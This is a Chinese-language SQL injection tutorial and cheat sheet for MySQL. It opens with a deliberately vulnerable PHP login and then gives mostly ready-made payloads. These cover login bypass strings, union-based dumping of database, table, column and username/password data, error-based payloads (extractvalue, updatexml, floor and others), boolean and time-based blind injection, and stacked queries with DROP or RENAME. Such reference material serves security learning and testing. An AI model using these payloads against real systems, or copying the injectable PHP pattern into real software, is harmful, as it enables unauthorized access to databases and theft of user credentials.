# MySQL

Author: H3rmesk1t

Data: 2022.03.12

# SQL 注入
## 概念
所谓`SQL`注入, 简单来说就是开发者没有对用户的输入数据进行严格的限制或转义操作, 导致用户在`Web`表单等能与数据库交互的地方构造特殊的`SQL`命令, 从而来达到欺骗服务器, 泄露数据库的信息, 执行命令甚至`getshell`的目的.


下面给出示例代码, 模拟一个`Web`应用程序进行登录操作. 若登录成功, 则返回`success`; 否则返回`fail`.

```php
<?php
    $conn = mysqli_connect($servername, $username, $password, $dbname);
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    $username = @$_POST['username'];
    $password = @$_POST['password'];
    $sql = "select * from users where username = '$username' and password='$password';";
    $rs = mysqli_query($conn, $sql);
    if($rs->fetch_row()){
        echo "success";
    }else{
        echo "fail";
    }
?>
```

用户正常提交表单时的`SQL`语句为: `select * from users where username = 'xxx' and password = 'xxx';`. 而由于变量`$username`、`$password`均为用户可控输入内容, 因此当用户输入的`$username`为`admin'#`时, 提交表单的`SQL`语句为: `select * from users where username = 'admin'# and password = 'xxx';`. `#`是单行注释符, 可以将后边的内容给注释掉, 那么此条语句的语义将发生了变化, 用户可以不需要判断密码, 只需一个用户名即可完成登录操作, 这就导致了最简单的`SQL`注入漏洞.

## 种类
以注入点分类, 可以分为如下几类:
 - 数字型注入
 - 字符型注入
 - 搜索型注入
 - 宽字节注入
 - Base64 变形注入

以提交方式分类, 可以分为如下几类:
 - GET 注入
 - POST 注入
 - Cookie 注入
 - X-Forwarded-For 注入
 - User Agent 注入

以执行效果分类, 可以分为如下几类:
 - 联合注入
 - 报错注入
 - 布尔盲注
 - 时间盲注
 - 堆叠注入


# MySQL 简介
[MySQL](https://baike.baidu.com/item/MySQL/471251#:~:text=MySQL%E6%98%AF%E4%B8%80%E4%B8%AA%E5%85%B3%E7%B3%BB,%E4%BD%9C%E4%B8%BA%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%82)是一个关系型数据库管理系统, 由瑞典`MySQL AB`公司开发, 属于`Oracle`旗下产品. `MySQL`是最流行的关系型数据库管理系统之一, 在`WEB`应用方面, `MySQL`是最好的`RDBMS`(Relational Database Management System)应用软件之一.

`MySQL`是一种关系型数据库管理系统, 关系数据库将数据保存在不同的表中, 而不是将所有数据放在一个大仓库内, 这样就增加了速度并提高了灵活性.

`MySQL`所使用的`SQL`语言是用于访问数据库的最常用标准化语言. `MySQL`软件采用了双授权政策, 分为社区版和商业版, 由于其体积小、速度快、总体拥有成本低, 尤其是开放源码这一特点, 一般中小型网站的开发都选择`MySQL`作为网站数据库.

一个完整的`MySQL`管理系统结构通常如下图, 可以看到`MySQL`可以管理多个数据库, 一个数据库可以包含多个数据表, 而一个数据表有含有多条字段, 一行数据正是多个字段同一行的一串数据.

<div align=center><img src="./images/1.png"></div>


# MySQL 注入
在`MySQL`数据库中, 常见的对数据进行处理的操作有: 增、删、改、查这四种基本操作, 每一项操作都具有不同的作用, 共同构成了对数据的绝大部分操作, 与此同时也都具有着`SQL`注入的安全风险. 一个`MySQL`的查询语句完整格式如下:

```php
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

## 常见基本函数
在`MySQL`中, 常用来获取基本信息的函数有:

```php
version()               # 查看当前数据库版本
@@version
@@global.vesion

user()                  # 查看当前登录用户
system_user()
current_user()
session_user()
current_user

sechma()                # 当前使用的数据库
database()

@@datadir               # 数据存储路径
@@basedir               # MySQL 安装路径
@@pid_file              # pid-file 文件路径
@@log_error             # 错误日志文件路径
@@slave_load_tmpdir     # 临时文件夹路径
@@character_sets_dir    # 字符集设置文件路径


@@version_compile_os	# 操作系统版本
```

## 常见字符串函数
在`MySQL`中, 常用来对字符串进行处理的函数有:

```php
mid()                   # 截取字符串
substr()
length()                # 返回字符串的长度
substring()						
left()                  # 从左侧开始取指定字符个数的字符串
concat()                # 没有分隔符的连接字符串
concat_ws()             # 含有分割符的连接字符串
group_concat()          # 连接一个组的字符串
ord()                   # 返回 ASCII 码
ascii()	
hex()                   # 将字符串转换为十六进制
unhex()                 # hex 的反向操作
md5()                   # 返回 MD5 值
round(x)                # 返回参数 x 接近的整数
floor(x)                # 返回不大于 x 的最大整数
rand()                  # 返回 0-1 之间的随机浮点数
load_file()             # 读取文件, 并返回文件内容作为一个字符串
sleep()                 # 睡眠时间为指定的秒数
if(true, t, f)          # if 判断
benchmark()             # 指定语句执行的次数
find_in_set()           # 返回字符串在字符串列表中的位置
```

## 重要的数据库
```php
information_schema
mysql.innodb_table_stats                    # MySQL 默认存储引擎innoDB携带的表
mysql.innodb_index_stats
sys.schema_auto_increment_columns           # MySQL5.7 新增
sys.schema_table_statistics_with_buffer
```

## 重要的表

```php
schemata                # 数据库信息
schema_name

tables                  # 表信息
table_schema
table_name

columns                 # 字段信息
column_name
```

## 注入方式
例如: `http://www.test.com/sql.php?id=1`.
### 万能密码后台登陆
```php
admin' --
admin' #
admin'/*
or '=' or
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

### 判断是否存在注入
#### 数值型注入
 - sql.php?id=1+1
 - sql.php?id=-1 or 1=1
 - sql.php?id=-1 or 10-2=8
 - sql.php?id=1 and 1=2
 - sql.php?id=1 and 1=1

#### 字符型注入
 - sql.php?id=1'
 - sql.php?id=1"
 - sql.php?id=1' and '1'='1
 - sql.php?id=1" and "1"="1

### 联合查询注入

```php
# 判断 SQL 语句中一共返回了多少列
order by 3 --+

# 查看显示位
union select 1, 2, 3 --+

# 爆数据
union select 1, version(), database() --+

# 爆出单个数据库
union select 1, database(), schema_name from information_schema.schemata limit 0, 1 --+		

# 爆出全部数据库
union select 1, database(), group_concat(schema_name) from information_schema.schemata --+

# 爆出数据库 security 里的单个表名
union select 1, database(), (select table_name from information_schema.tables where table_schema = database() limit 0, 1) --+	

# 爆出数据库 security 里的所有表名
union select 1, database(), (select group_concat(table_name) from information_schema.tables where table_schema = database()) --+

# 从表名 users 中爆出一个字段来
union select 1, database(), (select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0, 1) --+

# 从表名 users 中爆出全部字段来
union select 1, database(), (select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'users' ) --+

# 从 users 表里对应的列名中爆出一个数据来
union select 1, database(), concat(id, 0x7e, username, 0x3A, password, 0x7e) from users limit 0,1 --+

# 从 users 表里对应的列名中爆出所有数据来
union select 1, database(), (select group_concat(concat(id, 0x7e, username, 0x3A, password, 0x7e)) from users) --+
```

### 报错注入
数据库报错注入版本限制:

|报错函数|数据库版本(5.0.96、5.1.60、5.5.29、5.7.26、8.0.12)|
|:----:|:----:|
|extractvalue|5.1.60、5.5.29、5.7.26、8.0.12|
|updatexml|5.1.60、5.5.29、5.7.26、8.0.12|
|floor|5.0.96、5.1.60、5.5.29、5.7.26|
|exp|5.5.29|
|geometrycollection|5.1.60、5.5.29|
|linestring|5.1.60、5.5.29|
|polygon|5.1.60、5.5.29|
|multipoint|5.1.60、5.5.29|
|multipolygon|5.1.60、5.5.29|
|multilinestring|5.1.60、5.5.29|

#### extractvalue
```php
# 当前数据库
and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+

# 爆出一个数据库, 需要注意显示长度存在限制, 太长的话不会显示全
and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) --+

# 从当前数据库里爆出一个表名
and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+

# 从当前数据库里的 users 表里爆出一个字段名来 
and extractvalue(1,concat(0x7e,( select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1 ),0x7e)) --+

# 从 users 表里对应的列名中爆出一个数据来
and extractvalue(1,concat(0x7e,( select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e)) --+
```

#### updatexml
```php
# 当前版本
and updatexml(1,concat(0x7e,(select version()),0x7e),3) --+

# 爆出一个数据库, 需要注意显示长度存在限制, 太长的话不会显示全
and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),3) --+	 

# 从当前数据库里爆出一个表名
and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+

# 从当前数据库里的 users 表里爆出一个字段名来 
and updatexml(1,concat(0x7e,( select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1 ),0x7e),3) --+

# 从 users 表里对应的列名中爆出一个数据来
and updatexml(1,concat(0x7e,( select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e),3) --+
```

#### floor
```php
# 当前版本
and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# 爆出一个数据库
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# 从当前数据库里爆出一个表名
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# 从当前数据库里的 users 表里爆出一个字段名来
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='security' and table_name='users' LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# 从 users 表里对应的列名中爆出一个数据来
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

#### exp
```php
and (select exp(~(select * from(select version())x))); --+
```

#### geometrycollection
```php
and geometrycollection((select * from(select * from(select version())a)b)); --+
```

#### linestring
```php
and linestring((select * from(select * from(select version())a)b)); --+
```

#### polygon
```php
and polygon((select * from(select * from(select version())a)b)); --+
```

#### multipoint
```php
and multipoint((select * from(select * from(select version())a)b)); --+
```

#### multipolygon
```php
and multipolygon((select * from(select * from(select version())a)b)); --+
```

#### multilinestring
```php
and multilinestring((select * from(select * from(select version())a)b)); --+
```

### 布尔盲注
以下语句均可以用大于、小于号结合二分法的方式来进行判断, 从而缩短注入所消耗的时长.
#### 判断长度
```php
# 判断当前数据库的长度
and length(database())=8 --+

# 判断当前数据库里有几张表
and ((select count(*) from information_schema.tables where table_schema=database())=4) --+

# 判断每张表的长度
and  length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+
and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1--+

# 判断表 users 的列数
and ((select count(*) from information_schema.columns where table_schema=database() and table_name='users')=3) --+

# 判断某张表的列数
and ((select count(*) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1))=3) --+

# 判断某张表里对应的字段的数据的长度
and  length((select username from users where id =1))=4 --+
and  length((select password from users where id =1))=4 --+
```

#### 爆破内容
```php
# 猜测当前数据库的名字
and ascii(substr((select database()),1))=115--+

# 猜测某张表的表名
and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5))=115 --+

# 猜测某张表里的某个列名
and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),8))=101 --+

# 猜测某张表里列名为 username 的数据
and ascii(substr((select username from users limit 0,1),1)) = 68--+
```

### 时间盲注
时间盲注主要是在布尔盲注的基础上, 利用可延时函数进行判断. 主要可以分为以下几种:
 - sleep
```php
# 表达式为 Ture 时, 页面卡住 5 秒, 否则页面卡住一秒.
and if(length(database())=8,sleep(5),1) --+
```
 - benchmark
```php
# 表达式为 Ture 时, 页面卡住 5 秒, 否则页面卡住一秒.
and if(length(database())=8,benchmark(10000000,sha(1)),1) --+
```
 - 笛卡尔积
```php
# 延迟不精确, count()数量大时, 费时就高; count()数量小时, 费时就低.
and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C); --+
```
 - get_lock
```php
# ctf表被锁住的前提下, 才会延迟 5 秒后进行判断(0=1), 否则不延迟就进行判断(1=1)
and get_lock('ctf',5)=1 --+
```
 - rlike
```php
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
```

### 堆叠注入
堆叠注入在`MySQL`上不常见, 必须要用到`mysqli_multi_query`或者`PDO`, 可以用分号分割来执行多个语句, 相当于可直连数据库. 由于分号`;`为`MySQL`语句的结束符, 若在支持多语句执行的情况下, 可利用此方法执行其他恶意语句, 如`RENAME`、`DROP`等.

注意, 通常多语句执行时, 若前条语句已返回数据, 则之后的语句返回的数据通常无法返回前端页面. 因此可以使用`union`联合注入, 若无法使用联合注入, 可考虑使用`RENAME`关键字, 将想要的数据列名/表名更改成返回数据的`SQL`语句所定义的表/列名. 参考: [2019强网杯——随便注](https://blog.csdn.net/qq_44657899/article/details/103239145).

PHP中堆叠注入的支持情况, 参考: [PDO场景下的SQL注入探究](https://xz.aliyun.com/t/3950). 

||Mysqli|PDO|MySQL|
|:----:|:----:|:----:|:----:|
|引入的PHP版本|5.0|5.0|3.0之前|
|PHP5.x是否包含|是|是|是|
|多语句执行支持情况|是|大多数|否|

### 二次注入



















































# 参考
 - [对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169#toc-35)